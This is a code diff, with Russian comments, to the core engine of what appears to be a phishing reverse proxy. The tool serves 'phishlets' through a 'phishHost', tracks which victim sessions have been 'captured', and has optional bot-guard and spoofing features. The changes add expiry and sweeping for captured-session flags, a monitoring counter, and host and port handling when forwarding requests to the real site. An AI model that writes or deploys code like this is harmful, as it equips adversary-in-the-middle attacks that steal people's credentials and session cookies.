@@ -36,7 +36,8 @@ type Engine struct {
 	js       func(src string, seed int64) string
 	limit    Limiter
 	capMu    sync.Mutex
-	capped   map[string]bool
+	capped   map[string]time.Time
+	capTTL   time.Duration
 	upstream map[string]string // origHost -> baseURL override (e2e/lab)
 	transport http.RoundTripper
 	fp       http.Handler
@@ -47,8 +48,8 @@ type Engine struct {
 type Limiter interface{ Allow(ip string) bool }
 
 func New(store core.PhishletStore, sessions core.SessionStore, bus core.EventBus) *Engine {
-	return &Engine{store: store, sessions: sessions, bus: bus, capped: map[string]bool{},
-		sidName: "sid", chPrefix: "/__fp/"}
+	return &Engine{store: store, sessions: sessions, bus: bus, capped: map[string]time.Time{},
+		sidName: "sid", chPrefix: "/__fp/", capTTL: 2 * time.Hour}
 }
 
 // SetSidName меняет имя session-cookie (дефолт sid). Свой ID на кампанию.
@@ -76,15 +77,56 @@ func (e *Engine) markCaptured(sid string) {
 	if sid == "" {
 		return
 	}
+	now := time.Now()
 	e.capMu.Lock()
-	e.capped[sid] = true
+	e.capped[sid] = now
+	sweep := len(e.capped)%128 == 0
+	ttl := e.capTTL
 	e.capMu.Unlock()
+	if sweep {
+		e.sweepCaps(now, ttl)
+	}
+}
+
+// SetCapTTL — время жизни флага захвата (дефолт 2ч). 0 = не чистить.
+func (e *Engine) SetCapTTL(d time.Duration) {
+	e.capMu.Lock()
+	e.capTTL = d
+	e.capMu.Unlock()
+}
+
+func (e *Engine) sweepCaps(now time.Time, ttl time.Duration) {
+	if ttl <= 0 {
+		return
+	}
+	e.capMu.Lock()
+	defer e.capMu.Unlock()
+	for sid, at := range e.capped {
+		if now.Sub(at) > ttl {
+			delete(e.capped, sid)
+		}
+	}
 }
 
 func (e *Engine) isCaptured(sid string) bool {
 	e.capMu.Lock()
 	defer e.capMu.Unlock()
-	return e.capped[sid]
+	at, ok := e.capped[sid]
+	if !ok {
+		return false
+	}
+	if e.capTTL > 0 && time.Since(at) > e.capTTL {
+		delete(e.capped, sid)
+		return false
+	}
+	return true
+}
+
+// CapCount — размер карты (для тестов/мониторинга).
+func (e *Engine) CapCount() int {
+	e.capMu.Lock()
+	defer e.capMu.Unlock()
+	return len(e.capped)
 }
 
 // SetGuard — Botguard + blocklist + spoof (опционально, Pro-паритет).
@@ -240,9 +282,9 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	}
 	origDirector := rp.Director
 	rp.Director = func(req *http.Request) {
-		fwd := req.Host
+		fwd := stripPort(req.Host)
 		if fwd == "" {
-			fwd = phishHost
+			fwd = stripPort(phishHost)
 		}
 		origDirector(req)
 		// Host апстриму — всегда оригинал (и в prod, и в e2e-override:
